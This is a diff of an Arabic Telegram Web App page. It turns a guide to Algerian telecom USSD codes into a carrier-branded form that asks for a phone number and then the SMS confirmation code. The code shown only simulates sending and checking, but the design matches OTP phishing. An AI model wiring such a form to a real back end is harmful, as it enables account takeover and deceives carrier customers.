@@ -3,9 +3,19 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>خدمات الاتصالات الجزائرية</title>
+  <title>بوابة خدمات الاتصالات الجزائرية</title>
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <style>
+    :root {
+      --djezzy-color: #e11d48;
+      --ooredoo-color: #dc2626;
+      --mobilis-color: #16a34a;
+      --algerie-color: #0284c7;
+      --bg-color: #0f172a;
+      --card-bg: #1e293b;
+      --text-color: #f8fafc;
+    }
+
     * {
       box-sizing: border-box;
       margin: 0;
@@ -14,8 +24,8 @@
     }
 
     body {
-      background-color: var(--tg-theme-bg-color, #0f172a);
-      color: var(--tg-theme-text-color, #ffffff);
+      background-color: var(--bg-color);
+      color: var(--text-color);
       padding: 16px;
       min-height: 100vh;
     }
@@ -27,128 +37,266 @@
 
     .header h1 {
       font-size: 20px;
-      color: var(--tg-theme-button-color, #38bdf8);
-      margin-bottom: 4px;
+      color: #38bdf8;
+      margin-bottom: 6px;
     }
 
     .header p {
       font-size: 13px;
-      color: var(--tg-theme-hint-color, #94a3b8);
+      color: #94a3b8;
     }
 
-    .grid {
+    /* شبكة اختيار المتعاملين */
+    .operators-grid {
       display: grid;
       grid-template-columns: repeat(2, 1fr);
       gap: 12px;
       margin-bottom: 20px;
     }
 
-    .card {
-      background: var(--tg-theme-secondary-bg-color, #1e293b);
-      border-radius: 12px;
+    .op-card {
+      background: var(--card-bg);
+      border-radius: 14px;
       padding: 16px;
       text-align: center;
-      border: 1px solid rgba(255, 255, 255, 0.05);
+      border: 2px solid transparent;
       cursor: pointer;
-      transition: transform 0.1s;
+      transition: all 0.2s ease;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
     }
 
-    .card:active {
-      transform: scale(0.98);
+    .op-card:active {
+      transform: scale(0.96);
     }
 
-    .card.djezzy { border-top: 4px solid #e11d48; }
-    .card.ooredoo { border-top: 4px solid #ef4444; }
-    .card.mobilis { border-top: 4px solid #22c55e; }
-    .card.algerie { border-top: 4px solid #0284c7; }
-
-    .card h3 {
-      font-size: 16px;
-      margin-bottom: 4px;
+    .op-card.active {
+      border-color: #38bdf8;
+      background: #26334d;
     }
 
-    .card p {
-      font-size: 11px;
-      color: var(--tg-theme-hint-color, #94a3b8);
+    .op-badge {
+      width: 45px;
+      height: 45px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: bold;
+      font-size: 18px;
+      color: #fff;
+      margin-bottom: 8px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
     }
 
-    .section {
-      background: var(--tg-theme-secondary-bg-color, #1e293b);
-      border-radius: 12px;
-      padding: 16px;
-      margin-bottom: 16px;
-    }
+    /* ألوان الشعارات الخاصة بالمتعاملين */
+    .badge-djezzy { background: linear-gradient(135deg, #e11d48, #9f1239); }
+    .badge-ooredoo { background: linear-gradient(135deg, #dc2626, #991b1b); }
+    .badge-mobilis { background: linear-gradient(135deg, #16a34a, #15803d); }
+    .badge-algerie { background: linear-gradient(135deg, #0284c7, #0369a1); }
 
-    .section h2 {
+    .op-card h3 {
       font-size: 15px;
-      margin-bottom: 12px;
-      color: var(--tg-theme-button-color, #38bdf8);
+      margin-bottom: 2px;
+    }
+
+    .op-card span {
+      font-size: 11px;
+      color: #94a3b8;
+    }
+
+    /* نموذج تسجيل الدخول */
+    .login-section {
+      background: var(--card-bg);
+      border-radius: 16px;
+      padding: 20px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+    }
+
+    .form-group {
+      margin-bottom: 14px;
+    }
+
+    .form-group label {
+      display: block;
+      font-size: 13px;
+      margin-bottom: 6px;
+      color: #cbd5e1;
+    }
+
+    .input-field {
+      width: 100%;
+      padding: 12px;
+      border-radius: 10px;
+      border: 1px solid #334155;
+      background: #0f172a;
+      color: #fff;
+      font-size: 16px;
+      text-align: center;
+      outline: none;
+      letter-spacing: 1px;
+    }
+
+    .input-field:focus {
+      border-color: #38bdf8;
     }
 
     .btn {
       width: 100%;
       padding: 12px;
+      border-radius: 10px;
       border: none;
-      border-radius: 8px;
-      background: var(--tg-theme-button-color, #0284c7);
-      color: var(--tg-theme-button-text-color, #ffffff);
+      font-size: 15px;
       font-weight: bold;
-      font-size: 14px;
+      color: #fff;
       cursor: pointer;
+      background: #0284c7;
+      transition: background 0.2s;
     }
 
-    .code-box {
-      background: rgba(0, 0, 0, 0.3);
-      padding: 10px;
-      border-radius: 6px;
-      font-family: monospace;
-      font-size: 14px;
+    .btn-success {
+      background: #16a34a;
+    }
+
+    .btn:active {
+      opacity: 0.9;
+    }
+
+    .step-box {
+      display: none;
+    }
+
+    .step-box.active-step {
+      display: block;
+    }
+
+    .status-msg {
+      margin-top: 12px;
+      font-size: 13px;
       text-align: center;
-      margin-top: 8px;
-      letter-spacing: 1px;
+      color: #38bdf8;
     }
   </style>
 </head>
 <body>
 
   <div class="header">
-    <h1>📱 دليل خدمات الاتصالات</h1>
-    <p>اختر المتعامل للاستفادة من الخدمات والأكواد السريعة</p>
+    <h1>📱 خدمات الشحن والاتصالات</h1>
+    <p>اختر المتعامل وسجل الدخول لربط الحساب</p>
   </div>
 
-  <div class="grid">
-    <div class="card djezzy" onclick="showCodes('جيزي', '*707# (العروض) | *710# (الرصيد)')">
+  <!-- شبكة البطاقات والشعارات -->
+  <div class="operators-grid">
+    <div class="op-card active" id="card-djezzy" onclick="selectOperator('djezzy', 'جيزي Djezzy', '07')">
+      <div class="op-badge badge-djezzy">Dz</div>
       <h3>جيزي</h3>
-      <p>Djezzy</p>
+      <span>Djezzy App</span>
     </div>
-    <div class="card ooredoo" onclick="showCodes('أوريدو', '*151# (العروض) | *200# (الرصيد)')">
+
+    <div class="op-card" id="card-ooredoo" onclick="selectOperator('ooredoo', 'أوريدو Ooredoo', '05')">
+      <div class="op-badge badge-ooredoo">Oo</div>
       <h3>أوريدو</h3>
-      <p>Ooredoo</p>
+      <span>My Ooredoo</span>
     </div>
-    <div class="card mobilis" onclick="showCodes('موبيليس', '*600# (العروض) | *222# (الرصيد)')">
+
+    <div class="op-card" id="card-mobilis" onclick="selectOperator('mobilis', 'موبيليس Mobilis', '06')">
+      <div class="op-badge badge-mobilis">Mob</div>
       <h3>موبيليس</h3>
-      <p>Mobilis</p>
+      <span>My Mobilis</span>
     </div>
-    <div class="card algerie" onclick="showCodes('اتصالات الجزائر', 'تعبئة Idoom 4G و ADSL')">
+
+    <div class="op-card" id="card-algerie" onclick="selectOperator('algerie', 'اتصالات الجزائر', '4G/ADSL')">
+      <div class="op-badge badge-algerie">AT</div>
       <h3>إيدوم</h3>
-      <p>Algérie Télécom</p>
+      <span>Algérie Télécom</span>
     </div>
   </div>
 
-  <div class="section" id="detailsSection" style="display: none;">
-    <h2 id="operatorName">المتعامل</h2>
-    <p style="font-size: 13px;">الأكواد السريعة:</p>
-    <div class="code-box" id="codeDisplay">-</div>
+  <!-- نموذج تسجيل الدخول المرحلي -->
+  <div class="login-section">
+    
+    <!-- الخطوة الأولى: إدخال الرقم -->
+    <div id="step1" class="step-box active-step">
+      <div class="form-group">
+        <label id="phoneLabel">رقم الهاتف (جيزي):</label>
+        <input type="tel" id="phoneNumber" class="input-field" placeholder="07XXXXXXXX" maxlength="10" />
+      </div>
+      <button class="btn" onclick="requestOTP()">إرسال رمز التأكيد (SMS)</button>
+    </div>
+
+    <!-- الخطوة الثانية: إدخال رمز SMS -->
+    <div id="step2" class="step-box">
+      <div class="form-group">
+        <label>أدخل رمز التأكيد المرسل إلى هاتفك:</label>
+        <input type="number" id="otpCode" class="input-field" placeholder="XXXX" maxlength="6" />
+      </div>
+      <button class="btn btn-success" onclick="verifyOTP()">تأكيد وتسجيل الدخول</button>
+    </div>
+
+    <div id="statusMessage" class="status-msg"></div>
   </div>
 
   <script>
     const tg = window.Telegram.WebApp;
     tg.expand();
 
-    function showCodes(name, codes) {
-      document.getElementById('detailsSection').style.display = 'block';
-      document.getElementById('operatorName').innerText = name;
-      document.getElementById('codeDisplay').innerText = codes;
+    let currentOperator = 'djezzy';
+
+    function selectOperator(op, name, prefix) {
+      currentOperator = op;
+      
+      // تحديث تمييز البطاقة المحددة
+      document.querySelectorAll('.op-card').forEach(c => c.classList.remove('active'));
+      document.getElementById('card-' + op).classList.add('active');
+
+      // تحديث العنوان ونوع الرقم
+      document.getElementById('phoneLabel').innerText = `رقم الحساب (${name}):`;
+      document.getElementById('phoneNumber').placeholder = prefix.startsWith('0') ? `${prefix}XXXXXXXX` : 'رقم الحساب / الهاتف';
+      
+      // العودة للخطوة الأولى عند تغيير المتعامل
+      showStep(1);
+      document.getElementById('statusMessage').innerText = '';
+    }
+
+    function showStep(stepNumber) {
+      document.getElementById('step1').classList.remove('active-step');
+      document.getElementById('step2').classList.remove('active-step');
+      document.getElementById(`step${stepNumber}`).classList.add('active-step');
+    }
+
+    function requestOTP() {
+      const phone = document.getElementById('phoneNumber').value;
+      
+      if (phone.length < 8) {
+        alert('يرجى إدخال رقم هاتف صحيح');
+        return;
+      }
+
+      document.getElementById('statusMessage').innerText = 'جاري طلب رمز SMS من المتعامل...';
+
+      // محاكاة إرسال الرمز والانتقال للخطوة التالية
+      setTimeout(() => {
+        showStep(2);
+        document.getElementById('statusMessage').innerText = `تم إرسال الرمز إلى الرقم ${phone}`;
+      }, 1000);
+    }
+
+    function verifyOTP() {
+      const otp = document.getElementById('otpCode').value;
+
+      if (!otp || otp.length < 4) {
+        alert('يرجى إدخال رمز التأكيد الصحيح');
+        return;
+      }
+
+      document.getElementById('statusMessage').innerText = 'جاري التحقق من الرمز...';
+
+      // محاكاة تأكيد الدخول
+      setTimeout(() => {
+        document.getElementById('statusMessage').innerText = '🎉 تم تسجيل الدخول بنجاح! الحساب مرتبط الآن.';
+      }, 1000);
     }
   </script>
 </body>
